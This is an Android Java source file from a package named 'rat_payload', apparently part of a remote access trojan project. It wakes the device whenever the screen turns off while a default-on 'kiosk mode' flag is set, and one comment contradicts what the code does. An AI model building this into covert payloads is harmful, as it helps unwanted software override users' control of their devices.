package com.app.rat_payload;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.preference.PreferenceManager;

/**
 * Created by anirudh on 12/19/16.
 */

public class ScreenOffReceiver extends BroadcastReceiver {

    private static final String PREF_KIOSK_MODE = "pref_kiosk_mode";

    @Override
    public void onReceive(Context context, Intent intent) {

        // Check if they're trying to turn off screen.
        if(intent.ACTION_SCREEN_OFF.equals(intent.getAction())){
            AppContext ctx = (AppContext) context.getApplicationContext();

            if(isKioskModeActive(ctx)) {
                wakeUpDevice(ctx);
            }

        }


    }


    /*
    *  Acquires wakelock and releases again.
    *
    *  @params - appContext: wrapper to listen for "SCREEN_OFF" and return wakelock.
    *
    */
    private void wakeUpDevice(AppContext appContext) {
        PowerManager.WakeLock wakeLock = appContext.getWakeLock();
        if(wakeLock.isHeld()) { //If the wake lock is held, release
            wakeLock.release();
        }
        wakeLock.acquire(); // Acquire

        wakeLock.release(); // Release wakelock.
    }


    /*
    *
    *  Returns true if the app is not in kiosk mode.
    *
    *  @params context
    *
    * */
    private boolean isKioskModeActive(final Context context) {
        SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(context);
        return sp.getBoolean(PREF_KIOSK_MODE, true);
    }

}
